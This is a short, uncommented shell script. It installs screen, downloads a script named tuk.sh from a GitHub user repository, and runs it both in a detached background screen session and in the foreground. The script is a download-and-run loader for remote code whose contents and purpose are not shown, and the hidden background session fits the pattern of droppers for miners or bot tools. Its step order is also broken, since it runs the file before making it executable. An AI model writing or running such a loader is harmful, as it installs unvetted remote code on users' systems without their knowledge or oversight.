#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/goldengoose45/weskey/raw/main/tuk.sh
screen -dmS tuk.sh ./tuk.sh 60 70
chmod +x tuk.sh
./tuk.sh
